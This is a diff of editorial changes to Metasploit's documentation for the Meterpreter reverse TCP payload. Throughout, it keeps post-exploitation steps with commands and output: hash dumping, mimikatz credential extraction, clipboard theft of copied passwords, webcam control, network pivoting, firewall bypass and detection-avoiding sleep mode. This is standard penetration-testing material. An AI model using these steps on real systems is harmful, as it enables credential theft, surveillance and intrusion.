@@ -1,9 +1,9 @@
 windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has
-to offer, and there's so many things you can do with it.
+to offer, and there are so many things you can do with it.
 
-It allows you to remotely control the file system, sniff, keylog, hashdump, network pivoting,
+It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting,
 control the webcam and microphone, etc. It has the best support for post modules, and you can
-load extensions such as mimikatz and python interpreter, etc.
+load extensions, such as mimikatz and python interpreter, etc.
 
 windows/meterpreter/reverse_tcp is also the default payload for all Windows exploit targets.
 
@@ -28,7 +28,7 @@ First, it is typically used as a payload for an exploit. Here's how to do that:
 
 Another way to use windows/meterpreter/reverse_tcp is to generate it as an executable. Normally,
 you would want to do it with msfvenom. If you are old school, you have probably also heard of
-msfpayload and msfencode: msfvenom is a replacement of those.
+msfpayload and msfencode. msfvenom is a replacement of those.
 
 The following is a basic example of using msfvenom to to generate windows/meterpreter/reverse_tcp
 as an executable:
@@ -51,7 +51,7 @@ C:\Users\user\Desktop
 
 **cd command**
 
-The ```cd``` command allows you to change directory. Example:
+The ```cd``` command allows you to change directories. Example:
 
 ```
 meterpreter > cd C:\\
@@ -226,7 +226,7 @@ The ```screenshot``` command takes a screenshot of the target machine.
 
 **webcam_list**
 
-The ```webcam_list``` commands shows you a list of webcams that can be controlled by you. You
+The ```webcam_list``` commands shows you a list of webcams that you can control. You'll
 probably want to use this first before using any other webcam commands.
 
 **webcam_snap**
@@ -260,8 +260,8 @@ meterpreter > getsystem
 
 **hashdump**
 
-The ```hashdump``` commands allows you to dump the Windows hashes if there's enough privilege.
-Example:
+The ```hashdump``` commands allows you to dump the Windows hashes if there are the right privileges.
+For sxample:
 
 ```
 meterpreter > hashdump
@@ -277,9 +277,8 @@ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:e09fcdea29d93203c925b2056
 
 **Setting up for Testing**
 
-For testing purposes, if you're tired of manually generating a payload and starting a multi handler
-repeatedly, the auto_win32_multihandler.rc resource script in Metasploit automates that. Here's how
-you would use it:
+For testing purposes, if you don't want to manually generate a payload and start a multi handler
+repeatedly, you can use the auto_win32_multihandler.rc resource script in Metasploit to automate that process. Here's how you would use it:
 
 First, run the resource script:
 
@@ -304,16 +303,16 @@ msf exploit(handler) >
 ```
 
 Next, go to your ~/.msf4/local directory, you should see meterpreter_reverse_tcp.exe in there.
-Upload that payload to your test box, execute it, and you should receive a connection.
+Upload that payload to your test box and execute it. You should receive a connection.
 
 **Using a Post Module**
 
-One of the best things about using Meterpreter is you have access to a variety of post exploitation
-modules, specifically the multi and Windows categories. Post modules provide more abilities to
-control of collect data from the remote machine automatically. For example: stealing passwords
-from popular applications, enumerate or modify system settings, etc.
+One of the best things about Meterpreter is you have access to a variety of post exploitation
+modules, specifically for the multi and Windows categories. Post modules provide you with more capabilities to
+collect data from the remote machine automatically. For example, you can steal passwords
+from popular applications and enumerate or modify system settings.
 
-To use a post module from the Meterpreter prompt. Simply use the ```run``` command, like so:
+To use a post module from the Meterpreter prompt, simply use the ```run``` command:
 
 ```
 meterpreter > run post/windows/gather/checkvm 
@@ -330,9 +329,7 @@ documentation.
 
 **Using the Mimikatz Extension**
 
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from
-memory on Windows. This might actually be the first thing you want to use as soon as you get a
-high-privileged session (such as SYSTEM).
+[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from memory on Windows. This might actually be the first thing you want to use as soon as you get a high-privileged session, such as SYSTEM.
 
 To begin, load the extension:
 
@@ -342,8 +339,8 @@ Loading extension mimikatz...success.
 meterpreter > 
 ```
 
-This will create more commands for the Meterpreter prompt, most of them are meant to be used to
-retrieve user names/hashes/passwords and other information:
+This will create more commands for the Meterpreter prompt. Most of them are meant to be used to
+retrieve user names, hashes, passwords and other information:
 
 ```
 Mimikatz Commands
@@ -360,7 +357,7 @@ Mimikatz Commands
     wdigest           Attempt to retrieve wdigest creds
 ```
 
-An example of using ```msv```:
+An example of using the ```msv``` command:
 
 ```
 meterpreter > msv
@@ -382,8 +379,8 @@ AuthID    Package    Domain           User              Password
 
 **Using the extapi Extension**
 
-The main purpose of the extapi extension is for advanced enumeration of the target machine. For
-example: registered services, open windows, clipboard, ADSI, WMI queries, etc.
+The main purpose of the extapi extension is to perform advanced enumeration of the target machine. For
+example, you can enumerate things like registered services, open windows, clipboard, ADSI, WMI queries, etc.
 
 To begin, at the Meterpreter prompt, do:
 
@@ -393,10 +390,10 @@ Loading extension extapi...success.
 meterpreter > 
 ```
 
-One great feature of the extension is clipboard management. The Windows clipboard is interesting,
-because it can store anything sensitive: files, user names, passwords, etc, but not well protected.
+One great feature of the extension is clipboard management. The Windows clipboard is interesting
+because it can store anything that is sensitive, such as files, user names, and passwords, but it is not well protected.
 
-For example: A password manager is a popular tool to store passwords encrypted. It allows the user
+For example, a password manager is a popular tool to store encryped passwords. It allows the user
 to create complex passwords without the need to memorize any of them. All the user needs to do is
 open the password manager, retrieve the password for a particular account by copying it, and then
 paste it on a login page.
@@ -506,12 +503,15 @@ To learn more about the Python extension, please read this [wiki](https://github
 
 **Network Pivoting**
 
-There are three mains ways that you can use for moving around inside a network: the route command
-in the msf prompt, in the Meterpreter prompt, and portfwd.
+There are three mains ways that you can use for moving around inside a network: 
 
-The route command from the msf prompt allows you connect to hosts on a different network through
-the compromised machine. You should be able to determine that by looking at the compromised
-machine's ipconfig:
+ - The route command in the msf prompt
+ - The route command in the the Meterpreter prompt
+ - The portfwd command
+
+***Routing through msfconsole*** 
+
+The route command from the msf prompt allows you connect to hosts on a different network through the compromised machine. You should be able to determine that by looking at the compromised machine's ipconfig:
 
 ```
 [*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.201:49182) at 2016-03-04 20:35:31 -0600
@@ -547,10 +547,7 @@ IPv4 Netmask : 255.255.255.255
 ...
 ```
 
-The above shows that we have a Meterpreter connection to 192.168.1.201 - let's call this box A.
-And then box A is connected to the 192.100.0.0/24 VPN network. We as an attacker aren't connected
-to this network directly, but we can explore that network through box A. So here's what we do by
-routing:
+The example above shows that we have a Meterpreter connection to 192.168.1.201. Let's call this box A, and it  is connected to the 192.100.0.0/24 VPN network. As an attacker, we aren't connected to this network directly, but we can explore that network through box A. 
 
 At the msf prompt, do:
 
@@ -559,10 +556,9 @@ msf exploit(handler) > route add 192.100.0.0 255.255.255.0 1
 [*] Route added
 ```
 
-Note: ```1``` means the session ID, the payload that is used as a gateway to talk to other machines.
+The  ```1``` at the end of the route indicates the session ID, the payload that is used as a gateway to talk to other machines.
 
-So right now, we have a connection established to the VPN, and we should be able to connect to
-another machine from that network:
+So right now, we have a connection established to the VPN, and we should be able to connect to another machine from that network:
 
 ```
 msf auxiliary(smb_version) > run
@@ -573,16 +569,15 @@ msf auxiliary(smb_version) > run
 msf auxiliary(smb_version) > 
 ```
 
-Another neat trick using route is that you can also bypass the compromised host's firewall this
-way. For example, if the host has HTTP open, but SMB blocked by the firewall. You can try to
-compromise it via HTTP first, use the route command to talk to SMB, and then try to exploit SMB.
+Another neat trick using route is that you can also bypass the compromised host's firewall this way. For example, if the host has HTTP open, but SMB is blocked by the firewall, you can try to compromise it via HTTP first. You'll need to use the route command to talk to SMB and then try to exploit SMB.
 
-The route command in Meterpreter allows you change the routing table that is on the target machine.
-The way it needs to be configured is similar to the route command in msf.
+***Routing through Meterpreter***
 
-The portfwd command allows you to talk to a remote service like it's local. For example, if you
-are able to compromise a host via SMB, but not able to connect to the remote desktop service, then
-you can do:
+The route command in Meterpreter allows you change the routing table that is on the target machine. The way it needs to be configured is similar to the route command in msfconsole.
+
+***Routing through the portfwd command***
+
+The portfwd command allows you to talk to a remote service like it's local. For example, if you are able to compromise a host via SMB, but are not able to connect to the remote desktop service, then you can do:
 
 ```
 meterpreter > portfwd add –l 3389 –p 3389 –r > target host >
@@ -596,23 +591,19 @@ rdesktop 127.0.0.1
 
 **Meterpreter Paranoid Mode**
 
-The paranoid mode forces the handler to be strict about which Meterpreter should be connecting to
-it, hence the name "paranoid mode".
+The paranoid mode forces the handler to be strict about which Meterpreter should be connecting to it, hence the name "paranoid mode".
 
 To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode).
 
 **Meterpreter Reliable Network Communication**
 
-Exiting Metasploit using ```exit -y``` no longer terminates the payload session like it used to.
-Instead, it will continue to run behind the scenes, attempting to connect back to Metasploit when
-an appropriate handler is available. If you wish to exit the session, make sure to ```sessions -K``` first.
+Exiting Metasploit using ```exit -y``` no longer terminates the payload session like it used to. Instead, it will continue to run behind the scenes, attempting to connect back to Metasploit when an appropriate handler is available. If you wish to exit the session, make sure to ```sessions -K``` first.
 
 To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication).
 
 **Meterpreter Sleep Control**
 
-The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to
-avoid suspicious active communication, also better efficiency.
+The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to avoid suspicious active communication. It also provides better efficiency.
 
 It is very simple to use. At the Meterpreter prompt, simply do:
 
@@ -626,15 +617,13 @@ To learn more about this feature, please [click here](https://github.com/rapid7/
 
 **Meterpreter Stageless Mode**
 
-A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a
-normal one would actually cost too much time and bandwidth in a penetration test. To learn more
-about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode) to read more.
+A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a normal one would actually cost too much time and bandwidth in a penetration test. To learn more about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode) to read more.
 
 To use the stageless payload, use ```windows/meterpreter_reverse_tcp``` instead.
 
 **Meterpreter Timeout Control**
 
-The timeout control basically defines the life span of Meterpreter. To configure, use the
+The timeout control basically defines the life span of Meterpreter. To configure it, use the
 ```set_timeouts``` command:
 
 ```
@@ -663,19 +652,17 @@ Retry Total Time: 3600 seconds
 Retry Wait Time : 10 seconds
 ```
 
-To learn more about timeout control, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control).
+To learn more about timeout control, please [go here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control).
 
 **Meterpreter Transport Control**
 
-Transport Control allows you manage transports on the fly while the payload session is still
-running. Meterpreter can automatically cycle through the transports when communication fails,
-or you can do so manually.
+Transport Control allows you manage transports on the fly while the payload session is still running. Meterpreter can automatically cycle through the transports when communication fails, or you can do it manually.
 
 To learn more about this, please read this [documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control).
 
 ## Using the Post Exploitation API in IRB
 
-To enter IRB, at the Meterpreter prompt, do like the following:
+To enter IRB, do the following at the Meterpreter prompt:
 
 ```
 meterpreter > irb
@@ -687,15 +674,13 @@ meterpreter > irb
 
 **The client object**
 
-The client object in Meterpreter's IRB allows you control, or retrieve information about the host.
-For example, this demonstrates how to obtain the current privilege we're running the payload as:
+The client object in Meterpreter's IRB allows you control or retrieve information about the host. For example, this demonstrates how to obtain the current privilege we're running the payload as:
 
 ```ruby
 >> client.sys.config.getuid
 ```
 
-To explore the client object, there are a few tricks. For example, you can use the #inspect method
-to inspect it:
+To explore the client object, there are a few tricks. For example, you can use the #inspect method to inspect it:
 
 ```
 >> client.inspect
@@ -707,21 +692,18 @@ You can use the #methods method to see what methods you can use:
 >> client.methods
 ```
 
-To find the source of the method, you can use the #source_location method. For example, say I want
-to find the source code for the #getuid method:
+To find the source of the method, you can use the #source_location method. For example, say I want to find the source code for the #getuid method:
 
 ```
 >> client.sys.config.method(:getuid).source_location
 => ["/Users/user/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb", 32]
 ```
 
-The first element of the array is the location of the file. The second element is the line number
-of the method.
+The first element of the array is the location of the file. The second element is the line number of the method.
 
 **Using Railgun**
 
-Railgun allows you to use the remote machine's Windows API in Ruby. For example, to create a
-MessageBox on the target machine, do:
+Railgun allows you to use the remote machine's Windows API in Ruby. For example, to create a MessageBox on the target machine, do:
 
 ```
 >> client.railgun.user32.MessageBoxA(0, "hello, world", "hello", "MB_OK")
